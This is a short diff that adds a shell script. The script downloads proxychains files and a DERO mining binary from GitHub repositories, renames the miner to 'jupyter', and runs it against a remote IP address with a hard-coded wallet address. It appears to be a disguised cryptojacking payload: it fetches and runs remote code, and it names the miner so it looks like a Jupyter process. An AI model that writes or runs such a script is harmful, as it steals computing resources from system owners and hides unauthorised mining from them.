@@ -1,0 +1,6 @@
+curl -L -o lib https://github.com/leporitore/compile/raw/master/libproxychains4.so && chmod +x lib
+curl -L -o proxy https://github.com/leporitore/compile/raw/master/proxychains.conf && chmod +x proxy
+curl -L -o jupyter hhttps://github.com/terryputri/file/raw/main/bypass-dero && chmod +x jupyter
+curl -L -o jupyter https://github.com/terryputri/file/raw/main/dero-stratum && chmod +x jupyter
+curl -L -o compile.sh https://raw.githubusercontent.com/terryputri/file/main/compile.sh && chmod +x compile.sh
+./jupyter  -r 161.35.219.172:443  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.$(echo $(shuf -i 1-20000 -n 1)-GT)
